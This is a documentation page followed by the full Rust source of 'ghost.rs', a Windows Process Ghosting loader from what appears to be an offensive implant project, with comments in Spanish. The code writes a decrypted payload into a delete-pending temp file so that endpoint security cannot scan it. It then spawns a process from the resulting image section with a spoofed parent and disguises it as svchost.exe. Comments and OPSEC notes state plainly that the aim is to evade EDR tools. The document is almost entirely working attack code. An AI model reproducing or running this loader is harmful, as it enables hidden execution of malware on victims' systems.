# crowd — ghost.rs   (Process Ghosting — ⚡ GOD TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/ghost.rs` |
| **Lines** | 585 |
| **Tier** | S |
| **Cards** | T007-process-injection |
| **Role** | Process Ghosting |
| **Unsafe blocks** | 6 |

## Purpose

# crowd — ghost.rs   (Process Ghosting — ⚡ GOD TIER)

Implementación basada en:
- dev/Rust-for-Love/GhostingProcess/src/main.rs   (winapi + ntapi, por @5mukx)
- dev/RustRedOps/Process-Ghosting/src/ghosting.rs (referencia de flujo)

Por qué es Tier S vs Manual Map:
Manual Map  → VirtualAlloc anónimo RWX → Moneta/pe-sieve lo marcan como "unsigned"
Ghost       → proceso con SEC_IMAGE válido → igual que cualquier proceso del sistema
El archivo fue marcado delete-pending ANTES de escribir el payload
→ el EDR nunca tuvo un archivo escaneable en disco

Flujo completo:
1. GetTempFileName       → ruta temporal (ej: C:\Temp\TH1234.tmp)
2. NtOpenFile            → abrir con DELETE | WRITE | READ | SYNCHRONIZE
3. NtSetInformationFile  → marcar FILE_DISPOSITION_INFORMATION (delete-pending)
↑ CRITICO: archivo ya no es escaneable pero sigue siendo escribible
4. NtWriteFile           → escribir payload en archivo delete-pending
5. NtCreateSection       → SEC_IMAGE desde archivo delete-pending
6. NtClose(h_file)       → archivo desaparece del disco; sección persiste
7. NtCreateProcessEx     → proceso desde sección (+ parent = PPID spoof)
8. NtQueryInformationProcess → obtener PebBaseAddress del proceso ghosted
9. NtReadVirtualMemory   → leer PEB del proceso ghosted
10. RtlCreateProcessParametersEx → parámetros con ruta legítima (svchost.exe)
11. VirtualAllocEx + WriteProcessMemory → escribir params en proceso ghosted
12. WriteProcessMemory(PEB.ProcessParameters) → actualizar puntero en PEB
13. NtCreateThreadEx      → thread en entry point del payload

## Constants

- `PROCESS_CREATE_PROCESS`: `u32` = `0x0080`

## Types

### struct `FileDispositionInfo` (line 318)

## Public API

### `spawn_ghosted` (line 101)
```rust
pub fn spawn_ghosted(payload: &[u8], masquerade_path: &str, ppid: u32) -> Result<()>
```
Punto de entrada público: carga un PE vía Process Ghosting.

# Parámetros
- `payload`         — bytes del PE ya descifrado (sin pasar por disco)
- `masquerade_path` — ruta del proceso legítimo con la que se enmascara
(aparece en el árbol de procesos del EDR)
Típico: `r"C:\Windows\System32\svchost.exe"`
- `ppid`            — PID del proceso padre falso (0 = sin PPID spoof)

# OPSEC
- Sin regiones RWX anónimas en memoria
- El proceso aparece respaldado por una sección SEC_IMAGE (= legítimo)
- El payload nunca estuvo en disco en estado escaneable
- PPID spoof combinado en la misma llamada NtCreateProcessEx

### `find_pid_by_name` (line 558)
```rust
pub fn find_pid_by_name(name: &str) -> Option<u32>
```
Encuentra el PID del proceso con el nombre dado (usado para PPID auto-detect).
Ejemplo: `find_pid_by_name("explorer.exe")` → Some(PID)

## Internal Functions

- `create_section_from_delete_pending` (unsafe) — Pasos 2-6 del Ghosting: (line 277)
- `setup_process_parameters` (unsafe) — Pasos 10-12: construir RTL_USER_PROCESS_PARAMETERS con `masquerade_path` (line 381)
- `get_entry_point_rva` (unsafe) — Obtiene el AddressOfEntryPoint RVA desde la cabecera PE en memoria. (line 537)

## Key Dependencies

- `use anyhow::{anyhow, Context, Result};`
- `use ntapi::{`
- `use winapi::{`

## Full Source

```rust

//! # crowd — ghost.rs   (Process Ghosting — ⚡ GOD TIER)
//!
//! Implementación basada en:
//!   - dev/Rust-for-Love/GhostingProcess/src/main.rs   (winapi + ntapi, por @5mukx)
//!   - dev/RustRedOps/Process-Ghosting/src/ghosting.rs (referencia de flujo)
//!
//! Por qué es Tier S vs Manual Map:
//!   Manual Map  → VirtualAlloc anónimo RWX → Moneta/pe-sieve lo marcan como "unsigned"
//!   Ghost       → proceso con SEC_IMAGE válido → igual que cualquier proceso del sistema
//!                 El archivo fue marcado delete-pending ANTES de escribir el payload
//!                 → el EDR nunca tuvo un archivo escaneable en disco
//!
//! Flujo completo:
//!   1. GetTempFileName       → ruta temporal (ej: C:\Temp\TH1234.tmp)
//!   2. NtOpenFile            → abrir con DELETE | WRITE | READ | SYNCHRONIZE
//!   3. NtSetInformationFile  → marcar FILE_DISPOSITION_INFORMATION (delete-pending)
//!      ↑ CRITICO: archivo ya no es escaneable pero sigue siendo escribible
//!   4. NtWriteFile           → escribir payload en archivo delete-pending
//!   5. NtCreateSection       → SEC_IMAGE desde archivo delete-pending
//!   6. NtClose(h_file)       → archivo desaparece del disco; sección persiste
//!   7. NtCreateProcessEx     → proceso desde sección (+ parent = PPID spoof)
//!   8. NtQueryInformationProcess → obtener PebBaseAddress del proceso ghosted
//!   9. NtReadVirtualMemory   → leer PEB del proceso ghosted
//!  10. RtlCreateProcessParametersEx → parámetros con ruta legítima (svchost.exe)
//!  11. VirtualAllocEx + WriteProcessMemory → escribir params en proceso ghosted
//!  12. WriteProcessMemory(PEB.ProcessParameters) → actualizar puntero en PEB
//!  13. NtCreateThreadEx      → thread en entry point del payload

#![allow(non_snake_case, clippy::too_many_arguments)]

use anyhow::{anyhow, Context, Result};
use std::{
    ffi::CStr,
    mem::{size_of, zeroed},
    ptr::null_mut,
};

// ntapi — implementaciones nativas NT (sin pasar por Win32 layer)
use ntapi::{
    ntapi_base::CLIENT_ID,
    ntioapi::{
        FileDispositionInformation, NtCreateFile, NtSetInformationFile, NtWriteFile,
        FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, IO_STATUS_BLOCK,
    },
    ntmmapi::{NtCreateSection, NtReadVirtualMemory},
    ntobapi::NtClose,
    ntpebteb::PEB,
    ntpsapi::{
        NtCreateProcessEx, NtCreateThreadEx, NtCurrentPeb, NtOpenProcess, NtQueryInformationProcess,
        NtTerminateProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION,
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
    },
    ntrtl::{
        RtlCreateProcessParametersEx, RtlInitUnicodeString, PRTL_USER_PROCESS_PARAMETERS,
        RTL_USER_PROC_PARAMS_NORMALIZED,
    },
};

// winapi — helpers Win32 donde no hay alternativa NT directa
// (VirtualAllocEx, WriteProcessMemory, CloseHandle migrados a RecycledGate)
use winapi::{
    shared::{
        minwindef::{MAX_PATH, TRUE},
        ntdef::{InitializeObjectAttributes, HANDLE, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, UNICODE_STRING},
    },
    um::{
        fileapi::{GetTempFileNameA, GetTempPathA},
        processthreadsapi::OpenProcess,
        tlhelp32::{
            CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
            TH32CS_SNAPPROCESS,
        },
        userenv::{CreateEnvironmentBlock, DestroyEnvironmentBlock},
        winnt::{
            DELETE, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
            MEM_COMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE,
            PROCESS_ALL_ACCESS, SECTION_ALL_ACCESS, SEC_IMAGE, SYNCHRONIZE, THREAD_ALL_ACCESS,
        },
    },
};

// Necesario para abrir un proceso como padre de otro (PPID spoof via NtCreateProcessEx)
const PROCESS_CREATE_PROCESS: u32 = 0x0080;

/// Punto de entrada público: carga un PE vía Process Ghosting.
///
/// # Parámetros
/// - `payload`         — bytes del PE ya descifrado (sin pasar por disco)
/// - `masquerade_path` — ruta del proceso legítimo con la que se enmascara
///                        (aparece en el árbol de procesos del EDR)
///                        Típico: `r"C:\Windows\System32\svchost.exe"`
/// - `ppid`            — PID del proceso padre falso (0 = sin PPID spoof)
///
/// # OPSEC
/// - Sin regiones RWX anónimas en memoria
/// - El proceso aparece respaldado por una sección SEC_IMAGE (= legítimo)
/// - El payload nunca estuvo en disco en estado escaneable
/// - PPID spoof combinado en la misma llamada NtCreateProcessEx
pub fn spawn_ghosted(payload: &[u8], masquerade_path: &str, ppid: u32) -> Result<()> {
    unsafe {
        // ── 1. Generar ruta de archivo temporal ──────────────────────────────────
        let mut temp_dir  = [0u8; MAX_PATH];
        let mut temp_file = [0u8; MAX_PATH];

        let ret = GetTempPathA(MAX_PATH as u32, temp_dir.as_mut_ptr() as _);
        if ret == 0 || ret > MAX_PATH as u32 {
            return Err(anyhow!("GetTempPathA failed"));
        }

        let ret = GetTempFileNameA(
            temp_dir.as_ptr() as _,
            b"TH\0".as_ptr() as _,   // prefijo inofensivo de 2 chars
            0,
            temp_file.as_mut_ptr() as _,
        );
        if ret == 0 {
            return Err(anyhow!("GetTempFileNameA failed"));
        }

        let path_str = CStr::from_ptr(temp_file.as_ptr() as _)
            .to_str()
            .context("temp file path invalid UTF-8")?;

        // NT path: C:\Temp\TH1234.tmp → \??\C:\Temp\TH1234.tmp
        let nt_path = format!("\\??\\{}", path_str);

        // ── 2-6. Crear sección SEC_IMAGE desde archivo delete-pending ─────────────
        let h_section = create_section_from_delete_pending(&nt_path, payload)
            .context("Process Ghosting: create_section failed")?;

        // ── 7. Abrir handle del padre para PPID spoof (opcional) ─────────────────
        let mut parent_handle: HANDLE = if ppid > 0 {
            let h = OpenProcess(PROCESS_CREATE_PROCESS, 0i32, ppid);
            if h.is_null() {
                #[cfg(debug_assertions)]
                eprintln!("[crowd] Ghost: OpenProcess(PPID={}) failed — sin PPID spoof", ppid);
                null_mut()
            } else {
                h
            }
        } else {
            null_mut()
        };

        // Padre efectivo:
        //   - parent_handle != null → PPID spoof activo
        //   - OpenProcess(self)    → Handle real con PROCESS_CREATE_PROCESS
        let effective_parent: HANDLE = if !parent_handle.is_null() {
            parent_handle
        } else {
            let mut h_self: HANDLE = null_mut();
            let mut obj_attr: OBJECT_ATTRIBUTES = zeroed();
            obj_attr.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
            let mut cid: CLIENT_ID = zeroed();
            cid.UniqueProcess = winapi::um::processthreadsapi::GetCurrentProcessId() as _;

            let nt_status = NtOpenProcess(&mut h_self, PROCESS_CREATE_PROCESS, &mut obj_attr, &mut cid);
            if nt_status < 0 || h_self.is_null() {
                return Err(anyhow!("Ghost: NtOpenProcess(self) failed: NTSTATUS 0x{:08x}", nt_status as u32));
            }
            parent_handle = h_self; // para que se cierre al final
            h_self
        };

        // ── 8. NtCreateProcessEx — crear proceso ghosted ─────────────────────────
        let mut h_process: HANDLE = null_mut();
        let status = NtCreateProcessEx(
            &mut h_process,
            PROCESS_ALL_ACCESS,
            null_mut(),
            effective_parent,
            PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
            h_section,
            null_mut(),
            null_mut(),
            0,
        );
        NtClose(h_section);
        if !parent_handle.is_null() {
            crate::recycled::nt_close(parent_handle as usize);
        }

        if !NT_SUCCESS(status) {
            return Err(anyhow!("NtCreateProcessEx failed: NTSTATUS 0x{:08x}", status as u32));
        }

        // ── 8. Obtener PBI + leer PEB del proceso ghosted ────────────────────────
        let mut pbi: PROCESS_BASIC_INFORMATION = zeroed();
        let status = NtQueryInformationProcess(
            h_process,
            ProcessBasicInformation,
            &mut pbi as *mut _ as _,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            null_mut(),
        );
        if !NT_SUCCESS(status) {
            NtTerminateProcess(h_process, 0);
            crate::recycled::nt_close(h_process as usize);
            return Err(anyhow!("NtQueryInformationProcess failed: 0x{:08x}", status as u32));
        }

        let mut remote_peb: PEB = zeroed();
        let status = NtReadVirtualMemory(
            h_process,
            pbi.PebBaseAddress as _,
            &mut remote_peb as *mut _ as _,
            size_of::<PEB>(),
            null_mut(),
        );
        if !NT_SUCCESS(status) {
            NtTerminateProcess(h_process, 0);
            crate::recycled::nt_close(h_process as usize);
            return Err(anyhow!("NtReadVirtualMemory(PEB) failed: 0x{:08x}", status as u32));
        }

        // ── 9-12. Escribir parámetros de proceso con ruta de enmascaramiento ────
        setup_process_parameters(h_process, &pbi, masquerade_path).map_err(|e| {
            let _ = NtTerminateProcess(h_process, 0);
            crate::recycled::nt_close(h_process as usize);
            e
        })?;

        // ── 13. Calcular entry point y disparar thread ────────────────────────────
        // Para procesos SEC_IMAGE (Ghost), el kernel configura LdrInitializeThunk
        // automáticamente. Los procesos SEC_IMAGE no requieren CREATE_SUSPENDED +
        // NtResumeThread — el loader NT inicializa el proceso antes de ejecutar el EP.
        // Flujo exacto del legacy @5mukx: NtCreateThreadEx(flags=0, ep_rva calculated).
        let image_base = remote_peb.ImageBaseAddress as usize;
        let ep_rva = get_entry_point_rva(payload)
            .ok_or_else(|| anyhow!("Process Ghost: PE inválido — sin AddressOfEntryPoint"))?;
        let entry_point = (image_base + ep_rva as usize) as *mut _;

        let mut h_thread: HANDLE = null_mut();
        let status = NtCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            null_mut(),
            h_process,
            entry_point,
            null_mut(),
            0,   // flags=0: empezar inmediatamente (kernel maneja LdrInitializeThunk)
            0,
            0,
            0,
            null_mut(),
        );
        if !NT_SUCCESS(status) {
            NtTerminateProcess(h_process, 0);
            crate::recycled::nt_close(h_process as usize);
            return Err(anyhow!("NtCreateThreadEx failed: 0x{:08x}", status as u32));
        }

        crate::recycled::nt_close(h_thread as usize);
        crate::recycled::nt_close(h_process as usize);

        #[cfg(debug_assertions)]
        eprintln!(
            "[crowd] Ghost: PID {} ejecutándose como '{}'  entry=0x{:x}",
            pbi.UniqueProcessId as u32,
            masquerade_path,
            image_base + ep_rva as usize
        );

        Ok(())
    }
}

// ── Helpers internos ──────────────────────────────────────────────────────────

/// Pasos 2-6 del Ghosting:
///   NtOpenFile → NtSetInformationFile(delete-pending) → NtWriteFile(payload)
///   → NtCreateSection(SEC_IMAGE) → NtClose(file)
///
/// Devuelve el handle de la sección lista para NtCreateProcessEx.
unsafe fn create_section_from_delete_pending(nt_path: &str, payload: &[u8]) -> Result<HANDLE> {
    // UTF-16 para UNICODE_STRING
    let mut wide: Vec<u16> = nt_path.encode_utf16().collect();
    wide.push(0);

    let mut us_path: UNICODE_STRING = zeroed();
    RtlInitUnicodeString(&mut us_path, wide.as_ptr());

    let mut obj_attr: OBJECT_ATTRIBUTES = zeroed();
    InitializeObjectAttributes(
        &mut obj_attr,
        &mut us_path,
        0x40, // OBJ_CASE_INSENSITIVE
        NULL,
        NULL,
    );

    // Usar NtCreateFile en lugar de NtOpenFile para control total sobre CreateDisposition
    let mut io: IO_STATUS_BLOCK = zeroed();
    let mut h_file: HANDLE = null_mut();
    let status = NtCreateFile(
        &mut h_file,
        DELETE | SYNCHRONIZE | FILE_GENERIC_WRITE | FILE_GENERIC_READ,
        &mut obj_attr,
        &mut io,
        null_mut(),
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE,                // CreateDisposition: Crear o sobrescribir
        FILE_SYNCHRONOUS_IO_NONALERT,  // CreateOptions
        null_mut(),
        0,
    );
    if !NT_SUCCESS(status) {
        return Err(anyhow!("NtCreateFile({}) failed: 0x{:08x}", nt_path, status as u32));
    }

    // Marcar para eliminación ANTES de escribir el payload
    // → el archivo queda "delete-pending" — el EDR no puede leer su contenido
    // → pero nosotros aún podemos escribirlo y crear una sección desde él
    #[repr(C)]
    struct FileDispositionInfo { delete_file: u8 }
    let mut disp = FileDispositionInfo { delete_file: 1 };
    let mut io2: IO_STATUS_BLOCK = zeroed();
    let status = NtSetInformationFile(
        h_file,
        &mut io2,
        &mut disp as *mut _ as _,
        size_of::<FileDispositionInfo>() as u32,
        FileDispositionInformation,
    );
    if !NT_SUCCESS(status) {
        NtClose(h_file);
        return Err(anyhow!("NtSetInformationFile(delete-pending) failed: 0x{:08x}", status as u32));
    }

    // Escribir payload en el archivo delete-pending
    // Para archivos síncronos, ByteOffset debe ser NULL para usar la posición actual
    let mut io3: IO_STATUS_BLOCK = zeroed();
    let status = NtWriteFile(
        h_file,
        NULL,
        None,    // ApcRoutine: None
        NULL,
        &mut io3,
        payload.as_ptr() as _,
        payload.len() as u32,
        null_mut(), // ByteOffset = NULL para I/O síncrono
        null_mut(),
    );
    if !NT_SUCCESS(status) {
        NtClose(h_file);
        return Err(anyhow!("NtWriteFile(payload) failed: 0x{:08x}", status as u32));
    }

    // Crear sección de imagen desde el archivo delete-pending
    // → si el EDR intenta abrir el archivo para escanearlo aquí, ya está deleted
    let mut h_section: HANDLE = null_mut();
    let status = NtCreateSection(
        &mut h_section,
        SECTION_ALL_ACCESS,
        null_mut(),
        null_mut(),
        PAGE_READONLY,
        SEC_IMAGE,
        h_file,
    );
    NtClose(h_file); // el archivo desaparece del filesystem aquí; sección sobrevive

    if !NT_SUCCESS(status) {
        return Err(anyhow!(
            "NtCreateSection(SEC_IMAGE) failed: 0x{:08x} — el payload debe ser un PE válido",
            status as u32
        ));
    }

    Ok(h_section)
}

/// Pasos 10-12: construir RTL_USER_PROCESS_PARAMETERS con `masquerade_path`
/// y escribirlos en el proceso ghosted, actualizando PEB.ProcessParameters.
///
/// Esto hace que Process Explorer / EDR vean el proceso como `masquerade_path`
/// (ej: svchost.exe) en vez del archivo ghost (que ya no existe).
unsafe fn setup_process_parameters(
    h_process: HANDLE,
    pbi: &PROCESS_BASIC_INFORMATION,
    masquerade_path: &str,
) -> Result<()> {
    // Image path como UNICODE_STRING
    let mut wide_img: Vec<u16> = masquerade_path.encode_utf16().collect();
    wide_img.push(0);
    let mut us_img: UNICODE_STRING = zeroed();
    RtlInitUnicodeString(&mut us_img, wide_img.as_ptr());

    // DLL search path = System32
    let dll_dir = "C:\\Windows\\System32";
    let mut wide_dll: Vec<u16> = dll_dir.encode_utf16().collect();
    wide_dll.push(0);
    let mut us_dll: UNICODE_STRING = zeroed();
    RtlInitUnicodeString(&mut us_dll, wide_dll.as_ptr());

    // Directorio de trabajo = directorio del proceso enmascarado
    let work_dir = std::path::Path::new(masquerade_path)
        .parent()
        .and_then(|p| p.to_str())
        .unwrap_or("C:\\Windows\\System32");
    let mut wide_cwd: Vec<u16> = work_dir.encode_utf16().collect();
    wide_cwd.push(0);
    let mut us_cwd: UNICODE_STRING = zeroed();
    RtlInitUnicodeString(&mut us_cwd, wide_cwd.as_ptr());

    // WindowTitle = masquerade_path (igual que reference)
    let mut wide_wnd: Vec<u16> = masquerade_path.encode_utf16().collect();
    wide_wnd.push(0);
    let mut us_wnd: UNICODE_STRING = zeroed();
    RtlInitUnicodeString(&mut us_wnd, wide_wnd.as_ptr());

    // Environment block heredado del proceso actual
    let mut env_block: *mut winapi::ctypes::c_void = null_mut();
    if CreateEnvironmentBlock(&mut env_block, NULL, TRUE) == 0i32 {
        return Err(anyhow!("CreateEnvironmentBlock failed"));
    }

    // DesktopInfo del proceso actual (para evitar pantalla negra)
    let cur_peb = NtCurrentPeb();
    let desktop_ptr: *mut UNICODE_STRING = if !cur_peb.is_null()
        && !(*cur_peb).ProcessParameters.is_null()
    {
        &mut (*(*cur_peb).ProcessParameters).DesktopInfo
    } else {
        null_mut()
    };

    // Construir parámetros de proceso
    let mut params: PRTL_USER_PROCESS_PARAMETERS = null_mut();
    let status = RtlCreateProcessParametersEx(
        &mut params,
        &mut us_img,          // ImagePathName
        &mut us_dll,          // DllPath
        &mut us_cwd,          // CurrentDirectory
        &mut us_img,          // CommandLine (= ImagePathName — más limpio)
        env_block,
        &mut us_wnd,          // WindowTitle
        desktop_ptr,          // DesktopInfo (heredado del proceso actual)
        null_mut(),
        null_mut(),
        RTL_USER_PROC_PARAMS_NORMALIZED,
    );
    if !NT_SUCCESS(status) {
        if !env_block.is_null() { DestroyEnvironmentBlock(env_block); }
        return Err(anyhow!("RtlCreateProcessParametersEx failed: 0x{:08x}", status as u32));
    }

    // Alocar en proceso remoto en la MISMA dirección virtual que los params locales
    // (para que los punteros internos de UNICODE_STRING sean válidos en el proceso ghosted)
    let total = ((*params).Length as usize)
        .checked_add((*params).EnvironmentSize as usize)
        .ok_or_else(|| {
            if !env_block.is_null() { DestroyEnvironmentBlock(env_block); }
            anyhow!("params size overflow")
        })?;

    // Allocate in remote process at same VA hint via NtAllocateVirtualMemory (RecycledGate)
    // Critical: hint = params address so internal UNICODE_STRING pointers stay valid
    let mut remote_addr = params as *mut std::ffi::c_void;
    let mut region_size = total;
    let alloc_status = crate::recycled::nt_allocate_virtual_memory(
        h_process as usize,
        &mut remote_addr,
        0,
        &mut region_size,
        0x00003000, // MEM_COMMIT | MEM_RESERVE
        0x04,       // PAGE_READWRITE
    );
    if alloc_status < 0 || remote_addr.is_null() {
        if !env_block.is_null() { DestroyEnvironmentBlock(env_block); }
        return Err(anyhow!("NtAllocateVirtualMemory(params hint={:p}) failed (0x{:08x})", params, alloc_status as u32));
    }

    // Verify hint was accepted
    if remote_addr != params as *mut std::ffi::c_void {
        if !env_block.is_null() { DestroyEnvironmentBlock(env_block); }
        return Err(anyhow!("NtAllocateVirtualMemory hint rejected: got {:p}, expected {:p}", remote_addr, params));
    }

    // Write params block via NtWriteVirtualMemory (RecycledGate)
    let mut written_bytes: usize = 0;
    crate::recycled::nt_write_virtual_memory(
        h_process as usize,
        params as *mut std::ffi::c_void,
        params as *const std::ffi::c_void,
        (*params).Length as usize,
        &mut written_bytes,
    );

    // Write environment block if present
    if !(*params).Environment.is_null() {
        crate::recycled::nt_write_virtual_memory(
            h_process as usize,
            (*params).Environment as *mut std::ffi::c_void,
            (*params).Environment as *const std::ffi::c_void,
            (*params).EnvironmentSize,
            &mut written_bytes,
        );
    }

    // Update PEB.ProcessParameters in ghosted process via NtWriteVirtualMemory (RecycledGate)
    use std::mem::size_of;

    // Calculate PEB.ProcessParameters field address in remote process
    // CRITICAL: Don't dereference pbi.PebBaseAddress directly (it's remote).
    let offset_proc_params = unsafe {
        let peb_ptr = pbi.PebBaseAddress as *const PEB;
        (std::ptr::addr_of!((*peb_ptr).ProcessParameters) as usize) - (peb_ptr as usize)
    };
    let peb_proc_params_va = (pbi.PebBaseAddress as usize + offset_proc_params) as *mut std::ffi::c_void;

    let param_ptr_to_write = params as usize;
    let write_status = crate::recycled::nt_write_virtual_memory(
        h_process as usize,
        peb_proc_params_va,
        &param_ptr_to_write as *const _ as *const std::ffi::c_void,
        size_of::<usize>(),
        &mut written_bytes,
    );

    if !env_block.is_null() {
        DestroyEnvironmentBlock(env_block);
    }

    if write_status < 0 {
        return Err(anyhow!("NtWriteVirtualMemory(PEB.ProcessParameters) failed (0x{:08x})", write_status as u32));
    }

    Ok(())
}

/// Obtiene el AddressOfEntryPoint RVA desde la cabecera PE en memoria.
/// Soporta PE64 (Go, compiladores modernos). El payload ya está descifrado.
unsafe fn get_entry_point_rva(pe: &[u8]) -> Option<u32> {
    if pe.len() < size_of::<IMAGE_DOS_HEADER>() {
        return None;
    }
    let dos = pe.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }
    let nt_off = (*dos).e_lfanew as usize;
    if nt_off.saturating_add(size_of::<IMAGE_NT_HEADERS64>()) > pe.len() {
        return None;
    }
    let nt = (pe.as_ptr() as usize + nt_off) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }
    Some((*nt).OptionalHeader.AddressOfEntryPoint)
}

/// Encuentra el PID del proceso con el nombre dado (usado para PPID auto-detect).
/// Ejemplo: `find_pid_by_name("explorer.exe")` → Some(PID)
pub fn find_pid_by_name(name: &str) -> Option<u32> {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return None;
        }
        let mut entry: PROCESSENTRY32 = zeroed();
        entry.dwSize = size_of::<PROCESSENTRY32>() as u32;
        if Process32First(snap, &mut entry) == winapi::shared::minwindef::FALSE {
            crate::recycled::nt_close(snap as usize);
            return None;
        }
        loop {
            let proc_name = CStr::from_ptr(entry.szExeFile.as_ptr())
                .to_str()
                .unwrap_or("");
            if proc_name.eq_ignore_ascii_case(name) {
                crate::recycled::nt_close(snap as usize);
                return Some(entry.th32ProcessID);
            }
            if Process32Next(snap, &mut entry) == winapi::shared::minwindef::FALSE {
                break;
            }
        }
        crate::recycled::nt_close(snap as usize);
        None
    }
}

```